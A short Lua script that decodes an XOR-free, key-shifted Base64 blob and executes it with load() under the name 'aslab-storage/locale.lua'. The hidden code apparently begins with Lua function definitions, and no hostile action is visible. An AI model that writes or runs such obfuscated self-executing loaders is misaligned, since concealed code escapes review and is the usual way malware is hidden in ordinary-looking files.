local d, k = 'Hi0mGywhJybYBCcbGSQdDB0wLOAjHTHhwtjY2NgqHSwtKibYJCEa5h8dLAQnGxkkHSvg4RMjHTEVwh0mHMLCHi0mGywhJybY/icqJRksBScmHTHgJuHC2NjY2CQnGxkk2CsdKNj12AQnGxkkHQwdMCzg3xcsICctKxkmHCvf4dgnKtjf5N/C2NjY2CQnGxkk2BwhHyEsK9j12CwnKywqISYf4CUZLCDmHiQnJyrg4CwnJi0lGh0q4Cbh2Ccq2Ojh2OPY6Obt4eHC2NjY2CQnGxkk2CYdH9j12BwhHyEsK/IrLRrg6eTY6eHY9fXY3+XfwtjY2NghHtgmHR/YLCAdJtgcIR8hLCvY9dgcIR8hLCvyKy0a4Orh2B0mHMLY2NjYJCcbGSTYK9j12OAcIR8hLCvyKh0uHSorHeDh8h8rLRrg3+DdHN0c3Rzh3+TY393p39jm5tgrHSjh4fIqHS4dKisd4OHC2NjY2CEe2CvyKy0a4Onk2NsrHSjh2PX12CsdKNgsIB0m2CvY9dgr8istGuDbKx0o2OPY6eHYHSYcwtjY2NgqHSwtKibY4CYdH9gZJhzY3+Xf2Ccq2N/f4djm5tjgBCcbGSQdDB0wLODfFyUnJh0x3+HYJyrY39zdK9/h8h4nKiUZLOAr4cIdJhzCwh4tJhssIScm2P4nKiUZLAMf4B/h2CodLC0qJtgkJxsZJB3g3yMf3+TYJRksIOYeJCcnKuDgH9gnKtjo4djn2Ono6OjY49jo5u3h4dgdJhzCwh4tJhssIScm2AshMh0EGRodJOAjHTHhwtjY2NgkJxsZJNgr2PXY+ycmHiEf5gshMh0rEyMdMRXC2NjY2CodLC0qJtgr2BkmHNgr5iQZGh0k2Ccq2AQnGxkkHQwdMCzg3yshMh0X39jm5tgsJyssKiEmH+AjHTHh4dgnKtgsJyssKiEmH+AjHTHhwh0mHMLCHi0mGywhJybY/i0qJiEsLSodBBkaHSTgHuHYKh0sLSom2B7mJBkaHSTYJyrYBCcbGSQdDB0wLODfHi0qJiEsLSodF9/Y5ubYHuYjHTHh2Ccq2B7mIx0x2B0mHMIeLSYbLCEnJtj+LSomISwtKh38HSsb4B7h2CodLC0qJtge5hwdKxvYJyrYBCcbGSQdDB0wLODfHi0qJiEsLSodF9/Y5ubYHuYjHTHY5ubY3xccHSsb3+HYJyrY39/YHSYcwh4tJhssIScm2A0oHyoZHB0EGRodJOAt5Ngh4dgqHSwtKibYLeYkGRodJNgnKtgEJxsZJB0MHTAs4N8tKB8qGRwdF9/Y5ubYLCcrLCohJh/gLeYjHTHYJyrYIeHh2Ccq2CwnKywqISYf4C3mIx0x2Ccq2CHh2B0mHMI', 184
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local m = {}
for i = 1, #b do m[b:sub(i, i)] = i - 1 end
local t, n = {}, 1
for i = 1, #d, 4 do
    local a1, a2, a3, a4 = m[d:sub(i, i)], m[d:sub(i + 1, i + 1)], m[d:sub(i + 2, i + 2)], m[d:sub(i + 3, i + 3)]
    local v = a1 * 262144 + a2 * 4096 + (a3 or 0) * 64 + (a4 or 0)
    t[n] = (math.floor(v / 65536) - k) % 256
    n = n + 1
    if a3 then t[n] = (math.floor(v / 256) % 256 - k) % 256
        n = n + 1 end
    if a4 then t[n] = (v % 256 - k) % 256
        n = n + 1 end
end
local s = {}
for i = 1, #t do s[i] = string.char(t[i]) end
assert(load(table.concat(s), '@aslab-storage/locale.lua'))()
